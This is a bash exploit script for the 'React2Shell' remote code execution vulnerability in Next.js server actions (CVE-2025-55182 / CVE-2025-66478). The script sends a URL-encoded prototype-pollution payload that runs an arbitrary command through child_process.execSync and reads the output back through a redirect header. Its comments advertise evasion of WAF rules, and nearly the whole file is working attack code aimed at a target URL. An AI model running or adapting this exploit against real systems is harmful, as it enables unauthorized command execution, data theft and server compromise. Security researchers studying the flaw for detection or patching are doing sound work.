#!/bin/bash
# exploit-urlencoded.sh - React2Shell with URL-encoded payload (CVE-2025-55182 / CVE-2025-66478)
#
# Alternative delivery mechanism using application/x-www-form-urlencoded instead of multipart.
# Different WAF signature. Uses redirect-based stdout capture.
#
# IMPORTANT: Unlike multipart exploits, URL-encoded requires a VALID action ID.
# This is because Next.js validates the action ID BEFORE deserialization for non-multipart requests.
# Use enumerate-actions.sh to discover valid action IDs first.
#
# Advantages over multipart:
#   - No multipart boundary patterns (evades boundary-based WAF rules)
#   - Simpler payload construction
#   - More compact request size
#
# Limitation:
#   - Requires valid action ID (use enumerate-actions.sh)
#
# Usage: ./exploit-urlencoded.sh [TARGET_URL] [ACTION_ID] [COMMAND]
# Example: ./exploit-urlencoded.sh http://localhost:3443 "abc123...def" "id"

set -e

TARGET="${1:-http://localhost:3443}"
ACTION_ID="${2:-}"
COMMAND="${3:-id}"

echo "[*] React2Shell Exploit - URL-encoded mode (CVE-2025-55182 / CVE-2025-66478)"
echo "[*] Target: ${TARGET}"
echo "[*] Action ID: ${ACTION_ID:-<not provided>}"
echo "[*] Command: ${COMMAND}"
echo ""

if [[ -z "$ACTION_ID" ]]; then
    echo "[-] Action ID required for URL-encoded mode"
    echo "[*] URL-encoded path validates action ID BEFORE deserialization."
    echo ""
    echo "[*] Use enumerate-actions.sh to discover valid action IDs:"
    echo "    ./enumerate-actions.sh ${TARGET}"
    echo ""
    echo "[*] Or use multipart mode (no action ID needed):"
    echo "    ./exploit-redirect.sh ${TARGET} \"${COMMAND}\""
    exit 1
fi

# Escape single quotes in command for JavaScript string
ESCAPED_CMD=$(echo "$COMMAND" | sed "s/'/\\\\'/g")

# Build redirect payload (same as exploit-redirect.sh, production-compatible)
# - Execute command and base64 encode output
# - Wrap as valid URL so parsing succeeds -> HTTP 303
# - Create Error with digest in NEXT_REDIRECT format
PAYLOAD="var o=Buffer.from(process.mainModule.require('child_process').execSync('${ESCAPED_CMD}')).toString('base64');var e=new Error();e.digest='NEXT_REDIRECT;push;http://x/'+o+';307;';throw e;"

# Build the JSON payload
# Note: We're using jq for proper JSON escaping, falling back to manual if not available
if command -v jq &> /dev/null; then
    CHUNK0=$(jq -n --arg payload "$PAYLOAD" '{
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": "{\"then\":\"$B0\"}",
        "_response": {
            "_prefix": $payload,
            "_formData": {
                "get": "$1:constructor:constructor"
            }
        }
    }' | jq -c .)
else
    # Manual JSON construction (escape quotes in payload)
    ESCAPED_PAYLOAD=$(echo "$PAYLOAD" | sed 's/\\/\\\\/g' | sed 's/"/\\"/g')
    CHUNK0='{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B0\"}","_response":{"_prefix":"'"${ESCAPED_PAYLOAD}"'","_formData":{"get":"$1:constructor:constructor"}}}'
fi

CHUNK1='"$@0"'

# URL-encode the payloads
# Using printf + xxd + sed for portable URL encoding
urlencode() {
    local string="$1"
    local strlen=${#string}
    local encoded=""
    local pos c o

    for (( pos=0 ; pos<strlen ; pos++ )); do
        c=${string:$pos:1}
        case "$c" in
            [-_.~a-zA-Z0-9] ) o="$c" ;;
            * ) printf -v o '%%%02X' "'$c" ;;
        esac
        encoded+="$o"
    done
    echo "$encoded"
}

ENCODED_CHUNK0=$(urlencode "$CHUNK0")
ENCODED_CHUNK1=$(urlencode "$CHUNK1")

# Build the URL-encoded body
BODY="0=${ENCODED_CHUNK0}&1=${ENCODED_CHUNK1}"

# Send exploit with URL-encoded content type
RESPONSE=$(curl -s -D - \
    -X POST "${TARGET}" \
    -H "Next-Action: ${ACTION_ID}" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-raw "$BODY" \
    --max-time 30 \
    2>&1)

# Extract HTTP status code
HTTP_CODE=$(echo "$RESPONSE" | grep -E "^HTTP/" | tail -1 | awk '{print $2}')

# Extract x-action-redirect header (contains our output)
REDIRECT_HEADER=$(echo "$RESPONSE" | grep -i "^x-action-redirect:" | sed 's/^[^:]*: //' | tr -d '\r')

if [[ -n "$REDIRECT_HEADER" ]]; then
    # Format is: http://x/{base64_stdout};{redirectType}
    B64_OUTPUT=$(echo "$REDIRECT_HEADER" | sed 's/;push$//' | sed 's/;replace$//' | sed 's|^http://x/||')
    OUTPUT=$(echo "$B64_OUTPUT" | base64 -d 2>/dev/null || echo "$B64_OUTPUT")

    echo "[+] HTTP ${HTTP_CODE} - URL-encoded exploit successful"
    echo "[+] Command output:"
    echo "----------------------------------------"
    echo "$OUTPUT"
    echo "----------------------------------------"
elif [[ "${HTTP_CODE}" == "303" ]]; then
    echo "[?] HTTP 303 but no x-action-redirect header found"
    echo "[*] Full response:"
    echo "$RESPONSE"
elif [[ "${HTTP_CODE}" == "500" ]]; then
    echo "[-] HTTP 500 - Payload may have failed"
    ERROR_MSG=$(echo "$RESPONSE" | grep -o '"message":"[^"]*"' | head -1)
    if [[ -n "$ERROR_MSG" ]]; then
        echo "[*] Error: $ERROR_MSG"
    fi
else
    echo "[-] Unexpected HTTP ${HTTP_CODE}"
    echo "$RESPONSE"
fi
